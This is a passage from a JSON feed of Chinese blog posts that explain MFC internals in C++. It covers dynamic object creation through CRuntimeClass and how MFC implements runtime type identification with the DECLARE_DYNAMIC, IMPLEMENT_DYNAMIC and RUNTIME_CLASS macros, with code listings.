keyword\">class</span> <span class=\"token class-name\">CMainWindow</span> <span class=\"token operator\">:</span><span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">CFrameWnd</span></span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">// 使用宏动态创建对象</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">//DECLARE_DYNCREATE(CMainWindow);</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">//public:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">//\tstatic const CRuntimeClass classCMainWindow;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//\tvirtual CRuntimeClass* GetRuntimeClass() const;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">//\tstatic CObject* __stdcall CreateObject();</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 自己实现通过名字去动态创建对象</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">static</span> <span class=\"token keyword\">const</span> CRuntimeClass classCMainWindow<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">static</span> CObject<span class=\"token operator\">*</span> <span class=\"token function\">CreateObjectByName</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> className<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">static</span> CObject<span class=\"token operator\">*</span> __stdcall <span class=\"token function\">CreateObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">static</span> CRuntimeClass<span class=\"token operator\">*</span> <span class=\"token function\">GetRuntimeClass</span><span class=\"token punctuation\">(</span>CRuntimeClass<span class=\"token operator\">*</span> runtimeClassName<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> className<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token function\">CMainWindow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>函数：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>CObject<span class=\"token operator\">*</span> __stdcall <span class=\"token class-name\">CMainWindow</span><span class=\"token operator\">::</span><span class=\"token function\">CreateObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> CMainWindow<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>CObject<span class=\"token operator\">*</span> <span class=\"token class-name\">CMainWindow</span><span class=\"token operator\">::</span><span class=\"token function\">CreateObjectByName</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> className<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tCRuntimeClass<span class=\"token operator\">*</span> pClass <span class=\"token operator\">=</span> <span class=\"token function\">GetRuntimeClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>CRuntimeClass<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>CMainWindow<span class=\"token operator\">::</span>classCMainWindow<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> className<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">return</span> pClass<span class=\"token operator\">-></span><span class=\"token function\">CreateObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>CRuntimeClass<span class=\"token operator\">*</span> <span class=\"token class-name\">CMainWindow</span><span class=\"token operator\">::</span><span class=\"token function\">GetRuntimeClass</span><span class=\"token punctuation\">(</span>CRuntimeClass<span class=\"token operator\">*</span> runtimeClassName<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> className<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tCRuntimeClass<span class=\"token operator\">*</span> baseRuntimeClass <span class=\"token operator\">=</span> runtimeClassName<span class=\"token operator\">-></span>m_pBaseClass<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>runtimeClassName<span class=\"token operator\">-></span>m_lpszClassName <span class=\"token operator\">==</span> className<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> runtimeClassName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>baseRuntimeClass<span class=\"token operator\">!=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token function\">GetRuntimeClass</span><span class=\"token punctuation\">(</span>baseRuntimeClass<span class=\"token punctuation\">,</span> className<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token function\">__declspec</span><span class=\"token punctuation\">(</span>selectany<span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span> CRuntimeClass CMainWindow<span class=\"token operator\">::</span>classCMainWindow <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token string\">\"CMainWindow\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">class</span> <span class=\"token class-name\">CMainWindow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tCMainWindow<span class=\"token operator\">::</span>CreateObject<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>CRuntimeClass<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>CFrameWnd<span class=\"token operator\">::</span>classCFrameWnd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token constant\">NULL</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>结果：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n",
            "tags": [
                "MFC动态创建"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/MFC/MFC%E5%85%AD%E5%A4%A7%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6-02MFC%E8%BF%90%E8%A1%8C%E6%97%B6%E7%B1%BB%E5%9E%8B%E8%AF%86%E5%88%AB%EF%BC%88RTTI%EF%BC%89/",
            "url": "https://or0kit.github.io/Programming/MFC/MFC%E5%85%AD%E5%A4%A7%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6-02MFC%E8%BF%90%E8%A1%8C%E6%97%B6%E7%B1%BB%E5%9E%8B%E8%AF%86%E5%88%AB%EF%BC%88RTTI%EF%BC%89/",
            "title": "MFC六大核心机制-02MFC运行时类型识别（RTTI）",
            "date_published": "2022-05-16T11:40:41.000Z",
            "content_html": "<h1 id=\"什么是rtti\"><a class=\"anchor\" href=\"#什么是rtti\">#</a> 什么是 RTTI</h1>\n<p>MFC 运行时类型识别（英文：Runtime Type Information，缩写：RTTI），能够使用基类的指针或引用来检查这些指针或引用所指的对象的实际派生类，简单的意思就是它可以帮助我们在程序运行的过程中了解到某个对象所属类。</p>\n<blockquote>\n<p>简单的来讲运行时类型识别（RTTI）即是在程序运行的过程中实现对对象类型的识别，因为在大多数情况下，程序中的对象等都是在编译时就已知该对象的数据类型，所以要实现运行时对象类型识别则就需要花费一番心思。</p>\n</blockquote>\n<h2 id=\"本节需要掌握的知识点\"><a class=\"anchor\" href=\"#本节需要掌握的知识点\">#</a> 本节需要掌握的知识点</h2>\n<p>1、本节必须掌握的知识点</p>\n<p>MFC 为什么要自己去构建 RTTI？</p>\n<p>关键的宏：<br />\n <code>DECLARE_DYNAMIC</code> <br />\n <code>IMPLEMENT_DYNAMIC</code> <br />\n <code>RUNTIME_CLASS</code> <br />\n 关键的结构体  <code>CRuntimeClass</code></p>\n<p>2、需要简单了解的内容</p>\n<p><code>static</code>  关键字的作用<br />\n <code>const</code>  关键字的作用<br />\n C++ RTTI  <code>typeid</code>  操作符</p>\n<h2 id=\"使用编译器自带的rtti\"><a class=\"anchor\" href=\"#使用编译器自带的rtti\">#</a> 使用编译器自带的 RTTI</h2>\n<p>这是 VS2019 的 RTTI：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>但是后面我在测试使用 <code>typeid</code>  时发现开不开这个都行。</p>\n<p>需要包含  <code>typeinfo</code>  头文件<br />\n <code>typeid(类名)</code> <br />\n <code>typeid(对象)</code></p>\n<p>如下代码简单用一下 typeid，我们定一个了一个类 CAnimal 并创建了一个对象 pAnimal，使用 typeid 进行比较发现两者都属于同一个类：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;typeinfo></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">CAnimal</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token function\">CAnimal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token operator\">~</span><span class=\"token function\">CAnimal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">private</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token class-name\">CAnimal</span><span class=\"token operator\">::</span><span class=\"token function\">CAnimal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token class-name\">CAnimal</span><span class=\"token operator\">::</span><span class=\"token operator\">~</span><span class=\"token function\">CAnimal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> argv<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tCAnimal pAnimal<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token comment\">// C++ rtti 的简单使用</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeid</span><span class=\"token punctuation\">(</span>pAnimal<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token keyword\">typeid</span><span class=\"token punctuation\">(</span>CAnimal<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\tstd<span class=\"token operator\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"pAnimal 是属于CAnimal的对象\"</span> <span class=\"token operator\">&lt;&lt;</span> std<span class=\"token operator\">::</span>endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>执行结果：</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<h2 id=\"static关键词的作用\"><a class=\"anchor\" href=\"#static关键词的作用\">#</a> static 关键词的作用</h2>\n<p>当用 static 关键词定义一个变量，该变量则存储在全局数据区而不是局部的，如果 static 关键词的变量为某类的成员，则该成员与类进行关联，但并不会与类创建的对象进行关联，也就表示我们不需要创建对象就可以使用这个成员，所以我们想要使用的话就要通过 <code>类名::成员名</code> 的方式去使用，并且我们不可以在类的内部去赋值初始化，只可以在外部。</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<h2 id=\"const关键词的作用\"><a class=\"anchor\" href=\"#const关键词的作用\">#</a> const 关键词的作用</h2>\n<p>使用 const 关键词定义的成员，同样没办法直接初始化，需要在初始化列表中进行初始化：</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<h2 id=\"static和const关键词一起使用\"><a class=\"anchor\" href=\"#static和const关键词一起使用\">#</a> static 和 const 关键词一起使用</h2>\n<p>如果一个成员使用了 static const 双关键词，我们还是按照 static 关键词的方法去使用，但是在初始化的时候需要加上 const 关键词：</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<h2 id=\"mfc为什么要自己去构建rtti\"><a class=\"anchor\" href=\"#mfc为什么要自己去构建rtti\">#</a> MFC 为什么要自己去构建 RTTI</h2>\n<p>在 MFC 出来的时候 C++ 并没有 RTTI 这个概念，所以 MFC 自己设计了这样一套东西，其依靠的就是两个宏：  <code>DECLARE_DYNAMIC</code>  、  <code>IMPLEMENT_DYNAMIC</code>  ，其中  <code>IMPLEMENT_DYNAMIC</code>  宏也包含了一个关键的宏  <code>RUNTIME_CLASS</code>  以及关键结构体  <code>CRuntime Class</code>  。</p>\n<h2 id=\"mfc中rtti的本质\"><a class=\"anchor\" href=\"#mfc中rtti的本质\">#</a> MFC 中 RTTI 的本质</h2>\n<p>通过前面的介绍我们知道了 RTTI 的核心就是知道<strong>某个对象是属于某个类</strong></p>\n<p>这里我们继续使用前面我们手动创建 MFC 的代码：</p>\n<p>Hello.h:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\">once</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">WIN32_LEAN_AND_MEAN</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;afxwin.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">CMyApp</span><span class=\"token operator\">:</span><span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">CWinApp</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">virtual</span> BOOL <span class=\"token function\">InitInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">CMainWindow</span> <span class=\"token operator\">:</span><span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">CFrameWnd</span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">CMainWindow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>Hello.cpp:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"Hello.h\"</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>CMyApp theApp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>BOOL <span class=\"token class-name\">CMyApp</span><span class=\"token operator\">::</span><span class=\"token function\">InitInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tm_pMainWnd <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> CMainWindow<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tm_pMainWnd<span class=\"token operator\">-></span><span class=\"token function\">ShowWindow</span><span class=\"token punctuation\">(</span>m_nCmdShow<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tm_pMainWnd<span class=\"token operator\">-></span><span class=\"token function\">UpdateWindow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">return</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token class-name\">CMainWindow</span><span class=\"token operator\">::</span><span class=\"token function\">CMainWindow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token function\">Create</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello World!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\tWS_OVERLAPPED <span class=\"token operator\">|</span> WS_CAPTION <span class=\"token operator\">|</span> WS_SYSMENU <span class=\"token operator\">|</span> WS_THICKFRAME <span class=\"token operator\">|</span> WS_MAXIMIZEBOX <span class=\"token operator\">|</span> WS_VSCROLL<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token comment\">// 左上角，既起始位置是（400,300），右下角（800,700）</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token comment\">// 700 -300 是高度  800-400 是宽度</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token function\">CRect</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">700</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>那么我们想知道我们的  <code>theApp</code>  是属于那个类的，我们该怎么做呢？</p>\n<p>接下来我们参考 MFC 是如何实现 RTTI 的，我们跟着模仿一个。</p>\n<p>我们先看一下  <code>CWinApp</code>  类:</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p>F12 跟进去后可以看到宏  <code>DECLARE_DYNAMIC</code></p>\n<p>我们修改为我们的  <code>DECLARE_DYNAMIC(CMyApp)</code>  , 但这个时候仍然无法编译，我们还缺少另一个宏 <code>IMPLEMENT_DYNAMIC(CMyApp, CWinApp);</code> ，把这句代码放到 Hello.cpp 中的  <code>CMyApp theApp;</code>  前面即可。</p>\n<p>这样我们的代码就有了运行时类型识别的功能了。</p>\n<p>接下来使用  <code>IsKindOf()</code>  函数。</p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<p>如图所示，成功！</p>\n<p>接下来了解几个宏。</p>\n<h3 id=\"宏runtime_class\"><a class=\"anchor\" href=\"#宏runtime_class\">#</a> 宏 RUNTIME_CLASS</h3>\n<p>在 VS2019 中的宏定义为：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">RUNTIME_CLASS</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>class_name<span class=\"token punctuation\">)</span> <span class=\"token function\">_RUNTIME_CLASS</span><span class=\"token punctuation\">(</span>class_name<span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">_RUNTIME_CLASS</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>class_name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>CRuntimeClass<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>class_name<span class=\"token operator\">::</span><span class=\"token keyword\">class</span></span><span class=\"token punctuation\">##</span><span class=\"token expression\">class_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span></span></pre></td></tr></table></figure><p>其中两个 #号则代表拼接符，一个 #号则表示转为字符串。<br />\n也就是说  <code>RUNTIME_CLASS(CWinApp)</code>  这一段代码可以转换为  <code>((CRuntimeClass*)(&amp;CWinApp::classCWinApp))</code></p>\n<p>这段代码代表着 <strong>取一个类的成员的地址并将其转化为  <code>CRuntimeClass</code>  类型的指针</strong>，而  <code>CRuntimeClass</code>  的结构如下：</p>\n<h3 id=\"cruntimeclass-结构体\"><a class=\"anchor\" href=\"#cruntimeclass-结构体\">#</a> CRuntimeClass 结构体</h3>\n<p>在 VS2019 中的定义为：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">CRuntimeClass</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// Attributes</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tLPCSTR m_lpszClassName<span class=\"token punctuation\">;</span>\t\t\t<span class=\"token comment\">// 类名称</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">int</span> m_nObjectSize<span class=\"token punctuation\">;</span>\t\t\t\t<span class=\"token comment\">// 类的大小</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tUINT m_wSchema<span class=\"token punctuation\">;</span> \t\t\t\t<span class=\"token comment\">// 加载类的模式编号</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tCObject<span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>PASCAL<span class=\"token operator\">*</span> m_pfnCreateObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 函数指针，定义了一个函数指针 m_pfnCreateObject 用来存放需要支持动态创建类的 CreateObject 